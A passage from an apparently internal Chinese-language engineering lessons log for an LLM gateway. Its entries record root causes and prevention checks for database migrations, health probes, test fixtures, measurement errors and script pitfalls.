- 场景：一次探 3 个模型，读数是「第 1 个 200、第 2/3 个 503 no_candidate」，读起来像「这个族只有第一个能跑」；实际上第 2 个撞上上游 429（`EndpointTPMExceeded`）后，**第 1 个（刚 200 过）也开始 no_candidate**。
- 根因：goal-retry 对同一节点连打 3 次 ⇒ `nodehealth` 的 `ConsecutiveFailures`（NodeKey=租户+provider+**凭据+模型**）达到 `circuitFailureThreshold`（付费档 3）⇒ `effectsFor` 触发 `EffectSetCredentialUnavailable` ⇒ `credential.Writer.SetCredentialUnavailable` 把 `credentials.availability_state` 置 `cooling`（3 分钟）**并把该凭据名下全部绑定置 `available=FALSE`** ⇒ 兄弟模型一起消失。写侧的 `writeModelLevelFailureOnly` 本来是对的（只冷自己），是**熔断路径**把范围放大到凭据级。
- 防复发检查：① 探活**一次只碰一个模型**，否则会把「凭据被冷却」误读成「这个族没有可用模型」；② 看到「某模型族全部 no_candidate」，**先查凭据级状态**（`credentials.availability_state`）再查模型级绑定（`credential_model_bindings.available`），两者的原因与修法完全不同；③ 用 `unavailable_reason` 的**前缀**判断是谁写的：`auto_<kind>` = 模型级、`auto_credential_<kind>` = 凭据级——本例 10 个绑定里 9 个是 `auto_credential_rate_limit`、1 个是 `auto_rate_limit`，一眼看出放大发生在哪条路径；④ 客户端给上游传的 `max_tokens` 过小会让 reasoning 模型返回「200 但内容为空」⇒ 网关判 `empty_response` ⇒ 探针量具自己把自己打挂，**探活不要带 `max_tokens`**。
- 证据：08:20:45–08:24:44 实测链（`node_probe_runs` + `credentials` + 10 条绑定读数）；判别依据 `domains/nodehealth/reducer.go:434` 与 `domains/credential/writer.go:518`（明写「✅ DO NOT update credentials.availability_state」）。
- 溯源：request_logs→session_turns 复核轮 §5.11.4；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.11.4 / §9.2 / §9.4（L9）。

## 2026-10-20 — 「目录」不等于「可路由清单」：写「某模型不存在」之前先确认目录是**谁**的（Seen: 1/3）
- 场景：上一轮文档写「用户清单里其余 6 个模型在本机**目录里根本没有**」；本轮实测发现 `/v1/models` 的返回**随可用凭据变化**（89 个 → 77 个，恰好等于另一个凭据的 provider 的模型数），而那 6 个模型**其实都在 `provider_models` / `credential_model_bindings` 里**，只是不可路由。
- 根因：把「某一时刻的目录快照」当成了「平台的模型集合」。目录是按**当前可用凭据**渲染的 ⇒ 凭据一挂，目录就少一大片 ⇒ 用目录做「存在性」判断会把「暂时不可用」说成「不存在」。
- 防复发检查：① 判「某模型在本机存不存在」要逐层查：`provider_models` → `credentials`（凭据级状态：`availability_state` / `quota_state` / `lifecycle_status`）→ `credential_model_bindings.available` → 探针状态（`node_probe_state.last_direct_ok` / `node_probe_runs` 的失败码分布）；② 文档里写「不存在」时必须同时写**判据与取数命令**，否则下一轮的人无法复核（本轮改成逐个归属表 + 取数命令）；③ 不可路由的原因要分到**四类**再下结论：**环境/上游退役（410 EOL）/ 上游账单（429 balance）/ 仓库规则（探针判据）**——四类的修法完全不同，混在一起就会把「上游 EOL」当成「仓库没实现」。
- 证据：§5.11.6 的逐个归属表（7 个模型 × 绑定/凭据/原因/性质）；`node_probe_runs` 的失败码分布（凭据 2：404×266 / timeout×206 / 500×138 / 410×96 / inconclusive×10）证明主因是「账号没部署这些模型」而非探针规则。
- 溯源：request_logs→session_turns 复核轮 §5.11.6；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.11.6 / §9.3。

## 2026-10-20 — 同一现象在**不同协议腿**上的规则要逐腿核对（Seen: 1/3）
- 场景：探针把 `z-ai/glm-5.3-flash` 判成 `probe_response_inconclusive`（上游 HTTP 200、`content:null`、reasoning 吃满了 32 token 预算），该模型因此永远到不了 `healthy_confirmed`、永远不可路由。读 `bg/probe_http_validation.go` 看不出问题——因为豁免在**另一条腿**上。
- 根因：**Responses 腿**接受「`status=incomplete` + `incomplete_details.reason=max_output_tokens` + 非空 `output`」作正向证据（注释明写「even if all of its output budget went into reasoning」），而 **chat 腿**要求 `choices[].message.content` 是非空字符串 ⇒ 同一件事，一条腿放行、一条腿定罪。
- 防复发检查：① 凡是「按证据强弱定生死」的规则，列出它覆盖的**全部**腿，逐腿对照「同一现象在这条腿上判什么」；② 判据文件分散在不同文件时，靠 grep 单个文件发现不了不对称——要按**规则**而不是按**文件**盘点；③ 不要为了让某条腿通过就改判据：本仓「2xx 不等于健康、必须有正向证据」是 2026-10-20 12h 审计轮**刻意**立的规矩（`bg/probe_observation_beat_gate_20261020_test.go` 整篇在钉），改动要单独一轮、且必须同时回答「reasoning 模型的探针预算该给多少」；④ **不在别人的任务里顺手改掉别人刻意立的规矩**——正确处置是**记为遗留 + 写清改它要回答什么问题**（本轮记为 L10）。
- 证据：`bg/probe_http_validation.go` 的 `responsesProbeProtocolEvidence` vs `bg/credential_probe_response_validation.go:147-152`；实测 `node_probe_runs` 里 `z-ai/glm-5.3-flash` 连续 200 + `probe_response_inconclusive` + attempt 递增。
- 溯源：request_logs→session_turns 复核轮 §5.11.5；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.11.5 / §9.5（L10）。

## 2026-10-20 — 「已提交」≠「已生效」的第二类实例：**仓库级运维脚本不在发布链上**（Seen: 1/3）
- 场景：L1 的口径修复（两处运维脚本从「按名字前缀枚举分区族」改成「按 `pg_inherits` 走父表」）已提交并推上 `origin/main`，但**生产机上跑的仍是旧版脚本**。
- 根因：这两类脚本**不在部署物里**——本机部署目录只有 `bin/ logs/ run/ raw-logs/ attachments/ backups/`，**没有 `scripts/`** ⇒ 改脚本**不需要重新部署**，但也**不会因为部署而生效**；生产机（154）上的副本是**拷贝件**（`/opt/llm-gateway-go/build-2515/…` 10-08、`build-src/…` 08-25），`pg_inherits=0` ⇒ 旧口径。
- 防复发检查：① 判「某改动已生效」先问**它跑在哪**：仓库级运维脚本 ⇒ 看**生产机上的副本内容**（`grep -c` 关键标记），不要看 git log；② 判「排程在跑它吗」要把**排程源列全**：用户 crontab + root crontab + `/etc/cron*` + systemd unit/timer + **其它所有用户的 crontab**（`for u in $(cut -d: -f1 /etc/passwd); do crontab -u $u -l; done`）——只查 `crontab -l` 会漏掉**别的用户**的排程；③ 副本拷贝件与发布链是**两条链**，修复要么进发布链，要么明确写「运维从 checkout 执行」；④ 本仓先例：`internal/billguard` 等旁挂单元同属这一类。
- 证据：§5.9.3.1（部署目录清单 + 154 两份副本的 `pg_inherits=0` + 三台机 × 5 类排程源零命中的实测输出与复核命令）。
- 溯源：request_logs→session_turns 复核轮 §5.9.3.1。

## 2026-10-20 — 「量不出来」是对**量法**的判断，不是对**事实**的判断（Seen: 1/3）
- 场景：上一轮把「列表端点对同一行集扫两遍」记成遗留，理由是「在本地小数据集上无法证明收益」。本轮改量法后，事实直接出来了。
- 根因：原量法选的是**连续量**（`EXPLAIN (ANALYZE, BUFFERS)` 的 buffers / 墙钟），而本机只有 ~1.2k 行 ⇒ 第二趟**全命中缓存** ⇒ 三种写法实测**完全相同**（都是 137 hit / 0.30ms）⇒ 这个量具在原理上就**分辨不出**这件事。改量**执行次数**（结构性、与数据量无关）⇒ 2→1 直接可见。
- 防复发检查：① 说「量不出」之前先问「**我选的量具有没有分辨这件事的能力**」——分辨率不足 ≠ 事实不存在；② 优先找**结构性**的量（执行次数、扫描的行集条数、依赖图形状、依赖的表名），而不是**连续**的量（耗时、buffers、CPU）；③ 量不出来时**不要**把它写成结论的一部分（「无法证明收益」会被下一轮当成「没有收益」），要写成「用这个量法量不出，换什么量法能证」。
- 证据：`admin/logs.go` 的 `listLogs` 合并聚合前后对照；`admin/logs_single_scan_test.go` 用 pgx `QueryTracer` 数「读日志源 + 带聚合 + 无 GROUP BY」的查询数（必须 = 1），并与旧两扫口径逐值对账；变异（把 COUNT 拆回独立查询）⇒ 门转红并打印录到的 SQL。
- 溯源：request_logs→session_turns 复核轮 §5.12.4 / §10.1；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.12.4 / §10.1。

## 2026-10-20 — 夹具里被比较的两个键必须**故意不同**，否则门分不出键漂移（Seen: 1/3）
- 场景：第一版真库门把会话行的 `model`（客户端模型）与 `raw_model_name`（上游原始模型）设成**同一个值**。变异「把匹配键从 `raw_model_name` 换成 `model`」**没让门变红** ⇒ 门看着在测、其实测不出来。
- 根因：门断言的是「指标取到了夹具的值」，而**两个键同值** ⇒ 「取对了」与「取错了」**产生同一个读数** ⇒ 门分辨不出。这与「允许侧判据要配前提断言」同族：门必须能分辨「对的」与「错的」，而不只是「有值」与「没值」。
- 防复发检查：① 写夹具时问一句「**我要防的那个漂移，会让这两个值不同吗**」；若不会，夹具就钉不住它；② 夹具里凡是**成对出现的语义相近字段**（上游原始模型 vs 客户端模型、请求体 vs 落库体、原始 id vs 归一化 id），默认给**不同**的哨兵值；③ 变异验证要**逐个**针对「换键/换列名」这类改法跑，而不是只跑一个「把逻辑改坏」的变异。
- 证据：`admin/auto_route_cost_views_session_source_test.go`（`rawModel = "gate-upstream-raw-model"` vs `clientModel = "gate-client-model-DIFFERENT"`）；变异 M2（匹配键换成 `model`）在两值同值时**全绿**、改成不同值后**立刻转红**（`avg_latency_ms` 变 NULL）。
- 溯源：request_logs→session_turns 复核轮 §5.12.2 / §5.12.5 / §10.2；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.12.5 / §10.2。

## 2026-10-20 — 「端点空」与「读源错」是**两件独立的事**（Seen: 1/3）
- 场景：`/api/admin/auto-route/cost/customer` 返回 `[]`。本轮修了读源（迁移 883 把两个活指标从冻结的 `_request_logs` 切到会话族），**端点仍然 `[]`** ⇒ 差点把「修好了但没生效」写进结论。
- 根因：视图的子查询是**相关子查询**，外层聚合表 `api_key_model_cost` 零行时**压根不执行** ⇒ 读源对不对都不影响结果。真正的原因是另一条独立的链：`api_key_model_cost` 的 trigger（`trg_update_api_key_model_cost`）在正典与全部 startup 迁移里**都不存在**，真库全触发器清点也确认它**没挂在任何表上**（函数 `update_api_key_model_cost()` 存在但无调用方）⇒ 该表从未被生产流量写过 ⇒ 端点从功能设计出来那天起就一直是 `[]`。
- 防复发检查：① 看到空结果按**三步**查：外层聚合表**有没有数据**（用 `count(*)` + `max(bucket)`，见下一条）→ 读源对不对 → 相关子查询在空表上不执行；② 要证明**读源**对，必须**造外层行**的夹具，不能靠「视图建出来了」或「端点不报错」；③ 结论里把「**读源已修**」与「**端点有数**」**分开写**，别让读者以为一个蕴含另一个；④ 若是**新功能缺口**（聚合链从未接线）而不是退役残留，就**登记为遗留并写清复活的前置顺序**，不要在「退役」这条线上顺手扩范围。
- 证据：迁移 883 的注释与 `sql/objects/views/*.sql`；真库 `pg_trigger` 全量清点（无 `trg_update_api_key_model_cost`）；`api_key_model_cost` 0 行、0 索引（⇒ 原函数 `ON CONFLICT` 会报 42P10）；真库门 `admin/auto_route_cost_views_session_source_test.go` 造外层行后两个指标都取到值。
- 溯源：request_logs→session_turns 复核轮 §5.12.2 / §5.12.3 / §10.3；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.12.3 / §10.3（L11）。

## 2026-10-20 — 跨族映射列时逐列查 `information_schema`，不要靠记忆（Seen: 1/3）
- 场景：把 `outbound_model` 映射到会话族的 `raw_model_name` 时，顺手把 `api_key_id` 直接对上 ⇒ 建视图直接报 `operator does not exist: text = integer`。
- 根因：同一个概念在三个族里是**三种类型**——会话族 `api_key_id` 是 **text**（写侧 `APIKeyID string`，落库是十进制文本）、v1 是 **bigint**、聚合表是 **integer**。凭印象写比较 ⇒ 隐式转换在两侧都不成立。
- 防复发检查：① 跨族映射列时**逐列查类型**（一张 `information_schema` 查询就够），并把**类型差异写进迁移注释**（它是下一个人的坑）；② 映射表里**显式标注类型**，不只标列名——「同名列」不等于「同类型列」；③ 写视图/SQL 之前先在真库跑一遍**会失败的比较**（`SELECT '2'::text = 2::integer`）比读代码快。
- 证据：迁移 883 注释（`::text` 的由来）；真库建视图时报 `operator does not exist: text = integer`（本轮真实踩到）；契约门 `migration_883_session_family_cost_view_metrics_test.go` 钉住 `::text` 不得被去掉（变异 M4 ⇒ 转红）。
- 溯源：request_logs→session_turns 复核轮 §5.12.2 / §10.4；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.12.2 / §10.4。

## 2026-10-20 — 判据会**污染它自己要用的度量**：先问「这个量会不会被我自己写高」（Seen: 1/3）
- 场景：证明「`api_key_model_cost` 从未被生产流量写过」的证据是 `pg_stat_user_tables.n_tup_ins = 0`。加完真库门后，同一个读数变成 **13**，而表里**0 行**、`n_tup_del=0` ⇒ 字面读数是「写进 13 行又删干净了」⇒ 差点把 L11 这条正确结论**整个推翻**。
- 根因（受控实验实测，不是猜的）：**PG 的 `n_tup_ins` 计入回滚事务里的插入**——`BEGIN; INSERT; ROLLBACK;` 之后计数确实 +1（而 `COMMIT` 后 +1、`DELETE` 后 `n_tup_del` +1，均已逐项对照）。本轮的真库门正是 `defer tx.Rollback()` 的**夹具插入** ⇒ **门把自己的度量写高了**。
- 防复发检查：① 用一个量下结论前，先问「**这个量会不会被我自己（的测试/任务）写高**」；② **可复现的判据**是「跑 N 次 ⇒ 计数恰好 +N、行数不变」——本轮连跑 3 次门，计数 13→16（**恰好 +3**）、行数恒 0 ⇒ 那 13 次全是门自己的夹具；③ 判「某表有没有被写过」优先用**结构事实**（触发器在不在、现在几行、`max(bucket)`、网关日志里有没有它的痕迹），**计数器**会被任何跑过夹具的测试抬高；④ 统计读数有**刷新延迟**（PG 收集器不是即时的）⇒ 同一会话里连读两次会拿到不同值，受控实验要先 `pg_sleep` 再读，否则会读到「全是 0」的假象。
- 证据：受控实验（`_stat_probe_t` 探针表：rollback +1 / commit +1 / delete `n_tup_del` +1）；真库门 `admin/auto_route_cost_views_session_source_test.go:88` 的 `defer tx.Rollback()`；13→16 的连跑复现；`pg_trigger` 全量清点 + `api_key_model_cost` 0 行。
- 溯源：request_logs→session_turns 复核轮 §5.12.2 订正框 / §5.12.3 / §10.5；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.12.2 / §5.12.3 / §10.5。

## 2026-10-20 — 读数「0」有两种成因：**取错了** 与 **本来就没有这种流量**（Seen: 1/3）
- 场景：`active_concurrent` 修完读源后，活体读数**仍然是 0** ⇒ 差点再写一次「修了但没生效」。
- 根因：第二种成因——会话族里 `is_auto_request` **全是 false**（hot 310 行 / parent 877 行，auto 行数 0 / 0）⇒ 本机这轮测试走的是**指定模型直连**，**压根没有 auto 路由流量**（`is_auto_request` 来自 **`X-Gw-Is-Auto` 头或 `model="auto"`**，`domains/streaming/handler.go:7006`）⇒ 5 分钟窗里没有可计数的行，**0 是正确的**。
- 防复发检查：① 看到 0 先分它是「取错了」还是「没有可取的」——查**上游集合的大小**（`count(*) FILTER (WHERE is_auto_request)`、`count(*) FILTER (WHERE success)`），而不是反复重跑同一个查询；② 利用**同一个视图里两个指标的不对称**做旁证：本例 7 天窗那个指标**同一时刻**取到了真实值（4046.1ms / 6395.8ms）⇒ 读源是通的、只是这条腿上没流量；③ 这与「端点空 ≠ 读源错」是同一族但**方向相反** ⇒ 合起来一条：**任何单个读数都不能同时定两件事**，一条读数只能定一件事。
- 证据：真库 `count(*) FILTER (WHERE is_auto_request)` = 0（hot 310 / parent 877）；`active_concurrent` 的 5 分钟窗读数 0；同期 `avg_latency_ms` 取到 4046.1 / 6395.8；真库门用夹具证明该腿**接线正确**（`active_concurrent == 1`）。
- 溯源：request_logs→session_turns 复核轮 §5.12.6 / §10.6；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.12.6 / §10.6。

## 2026-10-20 — 量页面耗时前，先确认「没有别的压测在同一个被测服务上」（Seen: 1/3）
- 场景：部署后复验，把 **API 全量扫**（511 条路由）和 **104 页逐页扫**「顺手并行」跑在同一个网关上 ⇒ `/dashboard` 读数从基线 2098ms 变成 **2920ms**，差点写成「本轮改动把仪表盘拖慢了 40%」。
- 根因：两个压测器**互相踩**。逐页扫**独占重跑 = 1965ms**（比基线还快）⇒ 2920ms 是**量具读数**、不是产品事实。诡异处：全站 `navMs` **中位数三次几乎不动**（1128 / 1120 / 1122ms）⇒ **只有长尾页被污染**，中位数完全不暴露这件事 ⇒ 只看中位数会漏、只看单页最大值会被骗。
- 防复发检查：① 测页面/接口耗时前**确认没有第二个压测在同一个被测服务上**（本轮正是「顺手并行」造成，最容易发生）；② 读数异常时**先独占重跑一次**再下结论；③ 跨版本比耗时**必须同条件**（同并发度、同是否独占、同机器负载）——只有「独占 vs 独占」可比；④ 报耗时结论时把**测量条件写进结论**（「独占跑的，API 全量扫未同时进行」），否则下一轮的人会拿不同条件的数字来对比。
- 证据：同一份 `sweep.mjs`、同一份代码三次读数 2098 / 2920 / 1965ms；`/dashboard` 的 `slow` 列三次都空（**没有任何单个 API ≥2000ms**），其自身端点最大 221ms（`admin/dashboard/swim-lane-init`）⇒ 页面耗时 = 87 个并行请求的聚合 + SPA 渲染；复验结论：API 全量 511 路由 0 个 >2s / 0 个 5xx，逐页 104 页 0 个 JS 异常、0 个慢 API、≥2000ms 页面 0 个，与 2756 基线逐条 join 后状态变化 4 处**全是 500→200**、0 处回退。
- 溯源：request_logs→session_turns 复核轮 §5.12.7 / §10.7；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.12.7 / §10.7。

## 2026-10-20 — 判「某个名字出现了没有」别用 `LIKE` 配 `_`：`_` 是**单字符通配符**（Seen: 1/3）
- 场景：上一轮判定「哪些视图还读 v1 裸母表」用 `pg_get_viewdef(v) LIKE '%_request_logs%'` ⇒ 结论「**5 张** `v_*` 视图读 v1」。本轮精确重判 ⇒ **实为 3 张**，另两张是**假阳性**。
- 根因：SQL 的 `LIKE` 里 **`_` 匹配任意单字符** ⇒ `'%_request_logs%'` 会把 `request_logs_with_current_month`（**canonical 视图名**）也判成命中 ⇒ **「v1 族」与「canonical」被混为一谈**。本轮**我自己新写的 883 POST_CONDITION 用的也是这条坏判据** ⇒ 同一把尺子一轮内坑了两次。
- 防复发检查：① 判「标识符出现了没有」**不用 `LIKE` 配 `_`**：用 `strpos(x,'_request_logs') > 0` / `position(...)` / **正则 + 词边界**（`\b` 尾巴是关键：`request_logs_with_current_month` 里的 `_` 是词字符 ⇒ `\b` 不成立）；② 先确认判据能分辨「要判的那个」与「最像它的那个」（本例是 canonical 名）；③ **给判据配一条「判据的判据」**（本轮 `TestMigration884_JudgmentInstrumentDistinguishesV1FromCanonical`：断言精确仪器命中 v1 字面量、**不**命中 canonical 名，并核对仓库自己的门里仍是那条正则）；④ 上一轮的**数量型结论**（「5 张」）下一轮要**重算**，别直接引用。
- 证据：真库 `pg_get_viewdef` 精确重判 13 张视图：3 张真读 v1、2 张假阳性；`internal/sqlreadguard` 的正则 `(?i)\b(FROM|JOIN)\s+(public\.)?_?request_logs\b` 对两者判定为「命中 / 不命中」⇒ 仓库的门是对的。
- 溯源：request_logs→session_turns 复核轮 §5.13.1 / §10.8；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.13.1。

## 2026-10-20 — 聚合视图的夹具桶必须**独占**：未来时间戳 + 动态找空桶（Seen: 1/3）
- 场景：给 3 张「按小时分桶」的聚合视图写真库门时，夹具落在当前小时 ⇒ 桶里混着真实流量 ⇒ 断言只能写成「≥ 某个数」（弱判据：fitRow 那条教训——只断言「没坏」的判据在「干脆没做」面前永远绿）。
- 根因与三个坑（本门实测踩出来的）：① **桶会被真实流量污染** ⇒ 改用**未来**的整点（视图窗口 `ts > now()-24h` **没有上界** ⇒ 未来行在窗内，而真实流量不可能有未来时间戳）⇒ 该桶独占、断言可精确；② **窗口外的桶不能写死**（第一版写死「now-30h」）⇒ 那个桶里**恰好有 1 行真实数据** ⇒「该桶为空」的前提不成立 ⇒ 阴性侧断言分不清是「窗口条件被删坏」还是「那个桶本来就有数据」⇒ 改为**动态找**一个「证明为空」的窗口外小时桶（从 now-28h 往后逐小时试）；③ **只往 hot 腿插夹具 ⇒ 「漏掉 parent 腿」的变异抓不到**（夹具在 hot，hot 单腿照样取得到）⇒ 必须再插一条**只在 parent 腿**的夹具做哨兵。
- 防复发检查：① 聚合视图的夹具**必须落在独占桶**里，否则断言只能写成「≥」；② 任何「这个桶是空的」都要**当场证明**（查询计数），不能假设；③ **每条腿都要有夹具**，否则「少一条腿」这种变异抓不到；④ 未来时间戳的代价要写进注释：将来视图若加上界 `ts <= now()`，夹具会掉出窗口、门会红 ⇒ 那时要改成「当前小时 + 按 request_id 精确过滤」，**不是**把断言改松。
- 证据：`admin/v_analytics_views_session_source_test.go`（5 条前提断言 + 3 张视图的正/负判据）；4 处变异全部转红：改回读 v1 ⇒ 前提红；删 24h 窗口 ⇒ 阴性侧红；断 details join ⇒ 红；只留 hot 腿 ⇒ **parent 腿哨兵缺失**红；恢复后绿。
- 溯源：request_logs→session_turns 复核轮 §5.13.5；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.13.5。

## 2026-10-20 — 「升级路径绿」≠「新装路径绿」：基线必须自洽（Seen: 1/3）
- 场景：迁移 884 把 3 张视图改读会话族后，**升级路径**一路绿、部署后读数也对；**新装路径**却在基线第 18647 行报 `relation "public.session_turns_hot" does not exist` 并**中止整个安装**。
- 根因：① 基线（`01-schema.sql`）是**逐语句**应用的，而 `CREATE VIEW` 会**急切校验**它引用的关系 ⇒ 基线里只要写了 `FROM public.session_turns_hot`（这个关系由**启动序列**建、基线不建），新装就必然死；② **升级路径看不出这个问题**（那些表早就存在）⇒ 两路径的信号**完全不同**。
- 防复发检查：① 改视图/改表前先问「**这个关系在基线时点存在吗**」——基线自建的是「基线自己 CREATE 出来的」，启动序列建的是「基线时点还没有」；② 视图的**部署形态**交给**迁移**换上，**基线保留 fallback 体**（基线自建 `request_logs` ⇒ fallback 体在基线时点有效）⇒ 两条路径最终同形；③ 立**基线自洽门**（静态、常驻）把「基线引用了基线不创建的关系」变成常驻约束，别靠某次新装撞出来；④ **门自己也要防「扫到 0 个对象就安静通过」**——本轮第一版 Go 正则漏了 `m` 标志 ⇒ 扫到 0 个视图 ⇒ 门「安静通过」（空集合同样满足「没有违规」）⇒ 门自带两条 Fatal。
- 证据：新装临时库实跑（修复后基线 exit=0）；新装链 282 条全绿；新装后 5 张视图与存量真库**逐字同形**（`strpos(pg_get_viewdef,'session_turns')>0` 且 `strpos(...,'_request_logs')=0`）；判据 `sql/schema/baseline_view_refs_test.go` 的变异（把基线里 `public.request_logs rl` 改成 `public.session_turns_hot rl`）⇒ 门红并点名。
- 溯源：request_logs→session_turns 复核轮 §5.13.7 / §10.10；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.13.7 / §10.10。

## 2026-10-20 — **量具比被测对象更严 ⇒ 造假阳性**：修尺子要先于下结论（Seen: 1/3）
- 场景：仓库自带的 fresh-install 链门报「8 条新破坏」，其中 7 条的错误都是 `DROP/CREATE INDEX CONCURRENTLY cannot run inside a transaction block`。
- 根因：**门自己的执行通道**无条件加 `--single-transaction`，而**真实安装器**会把带 `dbinit:no-transaction` 标记的文件送到**非事务通道** ⇒ 这 7 条在**门里**必然失败、在**真安装器里**其实成功 ⇒ **量具比被测对象更严**。
- 危害比假绿更隐蔽：门的失败集合里**混着真缺陷**（853 的队列表缺失）与**假破坏** ⇒ **信号被淹没**；门长期红着 ⇒ 没人相信它 ⇒ 它退化成摆设。
- 防复发检查：① **量具的执行通道必须与被测系统的执行通道逐字一致**（同一套标记分流、同一套事务语义）；② 门的失败集合要**分类**记账（「真破坏」与「量具造成的破坏」不能混进同一张 allowlist）；③ 门红了先问「**是我的尺子坏了吗**」；④ 修完尺子要**重跑**并按 allowlist 自带的收缩规则清理干净（本轮清空 18 条 ⇒ 门从「8 坏 / 18 期望」变成「0 坏 / 0 期望」）。
- 证据：本机 PG 18.10 临时库逐条实跑 —— 修前 `8 of 280 fail`、修后 `0 of 282 fail, 0 expected`；同包 `applyInstallerSQL` 早就尊重标记、只有 `runInstallerPSQL` 漏了 ⇒ 同一个文件里两套事务语义并存，本身就是坏尺子的味道。
- 溯源：request_logs→session_turns 复核轮 §5.13.8 / §10.9；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.13.8 / §10.9。

## 2026-10-20 — 断链时，先拿被断那条迁移**自己声明的依赖**去查链（Seen: 1/3）
- 场景：新装链在 853 报「队列表不存在」。读 853 的 runner 注释，它明写着「once **489/490** create the queue」⇒ **作者以为 489/490 在链里**，实际那两条**从未登记**进 `StartupFiles`。
- 根因与通式：一条迁移**自己文件头里声明的依赖**就是它最可信的依赖清单 ⇒ 断链时**先拿被断那条的声明去查链**，比翻全链快得多。顺带：对同一个对象的「创建者」往往有好几条（489 建表 / 490 补列 / 853 加 `automatic` 列）⇒ 断链常常是**整族没登记**，不是单条漏登记。
- 防复发检查：① 登记一条启动迁移时，把它的**声明依赖**一起核对是否在 `StartupFiles` 里；② 链上顺序**按依赖排**（489/490 必须在 853 之前）；③ 登记后**重跑整链**并对比失败集合（allowlist 能给出「改前 vs 改后」的精确差集）；④ 证「既有缺陷与本轮无关」要用**pristine HEAD 工作树**复跑（本轮 853 在 pristine 上同样失败）。
- 证据：853 文件头「Dependencies: 489/490_credential_probe_queue_*」+ runner 注释「once 489/490 create the queue」；`git worktree add` 到 `7c8aad856` 复跑同样在 853 失败；补登 489/490 后整链 0/282 失败、`TestFreshInstallerSessionTurnsHotBootstrap` 从「在 853 中止」转 PASS。
- 溯源：request_logs→session_turns 复核轮 §5.13.8 / §10.11；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.13.8 / §10.11。

## 2026-10-20 — 用**裸数字**做文本启发式 ⇒ 必配词边界 + 小数/单位排除（Seen: 2/3）
- 场景：逐页扫描的 `NOT_FOUND` 标记比上一轮多 1 页（`/admin/data-lifecycle`），
  差点被当成「本轮改动把该页搞坏了」。
- 根因：标记正则 `/404|页面不存在|Not Found/i` 命中的是页面正文里的
  「PostgreSQL 数据库 v17.10 **404.2 MB** 总占用」—— **库大小**恰为 404.2 MB。
  同类还有 UUID 里的 `…**8404**…`（**子串**命中），
  以及「标记测 `text.slice(0,200)`、落盘只存 `slice(0,160)`」⇒ 命中可能落在
  **没落盘**的区间里 ⇒ **事后无法复现**「为什么这一页被判成 NOT_FOUND」。
- 防复发检查：① **裸数字**（404/500/403）做匹配时必须同时有
  `\b` 词边界（排除 `8404` 子串）+ `(?![\.\d])`（排除 `404.2`）+
  `(?!\s*(?:MB|GB|KB|bytes|ms|行|条|个))`（排除 `404 MB`）；
  ② 更稳的是**只匹配明确措辞**（`页面不存在` / `Not Found` / `HTTP 404`），
  数字状态码交给**结构化字段**（`docStatus`）判，不受正文影响；
  ③ **标记的判定窗口必须与落盘窗口一致** ⇒ 判据与证据同源、可离线重算；
  ④ 判「标记集合变没变」前，**先把新出现的标记逐个证伪**
  （本轮：`docStatus=200` + 无真 5xx + 无 JS 异常 ⇒ 假阳性）。
- 证据：2758 页扫带标记页 19 → 修完 **10**；残留 7 个 `NOT_FOUND` 逐个核实为**真态**
  （`key/client/task/journey/approval/order not found`——路由表用合成 id，空态正确）；
  另 3 个 `ZERO_ROWS` 是数据态。⇒ 2758 的标记集合是 2757 的**子集** ⇒ 0 处回退。
- 溯源：request_logs→session_turns 复核轮 §5.13.10 / §10.12；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.13.10 / §10.12。

## 2026-10-20 — 「检查没跑成」与「检查通过」必须长得不一样（Seen: 1/3）
- 场景：写回验证脚本 `verify-model-writeback.sh` 打印了「=== 结果：PASS ===」，
  但**四段检查其实一段都没跑**。
- 根因：脚本用了 `mapfile`（bash **4+**），macOS **系统 bash 是 3.2**
  ⇒ 段落函数因 `mapfile: command not found` + `set -u` 的 `unbound variable` **静默失败**；
  而脚本没有 `set -e`、失败位只由 `bad()` 设置 ⇒ 段落整体挂掉时
  **既不置失败位也不非零退出** ⇒ 末尾照常打印 PASS。
- 防复发检查：① 依赖 bash 4+ 特性（`mapfile` / 关联数组 / `${var^^}`）的脚本
  **必须用 `~/sdk/bash5/bin/bash`**（本仓已有），脚本头注明所需 bash 版本；
  ② 判据脚本**每段**执行完要留下痕迹（段标题 + 计数），缺哪段一眼可见；
  ③ 「结论行」只能在**所有段都跑过**之后打印，任一段异常 ⇒ 非零退出；
  ④ 复跑前先 `bash --version` 确认解释器（macOS 自带 3.2，5.x 在 `~/sdk/bash5/bin`）。
- 证据：系统 bash 跑 ⇒ 3 处 `mapfile: command not found` + `unbound variable`，末尾仍「PASS」；
  `~/sdk/bash5/bin/bash` 跑 ⇒ A/B/C/D 四段全执行、**全项 PASS**
  （turn_no 1..5 连续、prompt_tokens 13→32→46→314→1066 单调、
  正文三列 `jsonb_typeof` 全 `array`、退役族零新增）。
- 溯源：request_logs→session_turns 复核轮 §5.13.10 / §10.13；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.13.10 / §10.13。

## 2026-10-20 — 判据脚本需要「**前提 / 段级 SKIP / 段级结论**」三件套（Seen: 1/3）
- 场景：定时补跑三模型累积式多轮时，写回验证脚本连续暴露 4 个问题，
  其中 3 个会让**产品结论被写错**。
- 根因（四处不同，但都是**量具**的缺陷，不是产品问题）：
  ① 脚本里 `... -> $p（说明对话没累积）`——**变量名后紧跟全角括号**；
  bash 5.2 在 `set -u` 下把非 ASCII 字节并进变量名 ⇒ `p?: unbound variable`
  ⇒ **B 段整段不执行**（脚本非零退出，没有假 PASS，但检查确实没跑）；
  ② B 段判据**缺前提**：全失败会话（每轮 503）里 history **不推进**
